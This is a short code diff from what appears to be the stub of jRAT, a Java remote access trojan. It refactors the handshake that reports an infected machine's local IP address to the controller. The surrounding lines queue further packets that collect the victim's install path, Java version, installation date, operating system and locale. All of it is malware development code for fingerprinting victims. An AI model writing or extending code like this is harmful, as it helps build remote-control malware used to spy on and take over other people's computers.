@@ -31,7 +31,7 @@ import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
 import se.jrat.stub.packets.outgoing.Packet10InitInstallPath;
 import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
 import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
-import se.jrat.stub.packets.outgoing.Packet28InitLanAddress;
+import se.jrat.stub.packets.outgoing.Packet12InitLocalAddress;
 import se.jrat.stub.packets.outgoing.Packet11InitInstallationDate;
 import se.jrat.stub.packets.outgoing.Packet36Initialized;
 import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
@@ -152,6 +152,7 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet9InitJavaVersion());
 		addToSendQueue(new Packet10InitInstallPath());
 		addToSendQueue(new Packet11InitInstallationDate());
+		addToSendQueue(new Packet12InitLocalAddress());
 
 
 
@@ -161,13 +162,7 @@ public class Connection implements Runnable {
 
 		addToSendQueue(new Packet26InitJavaPath(System.getProperty("java.home")));
 
-		String localip;
-		try {
-			localip = InetAddress.getLocalHost().getHostAddress();
-		} catch (Exception e) {
-			localip = "Unknown";
-		}
-		addToSendQueue(new Packet28InitLanAddress(localip));
+		
 
 
 		addToSendQueue(new Packet10InitDefaultLocale(Locale.getDefault()));
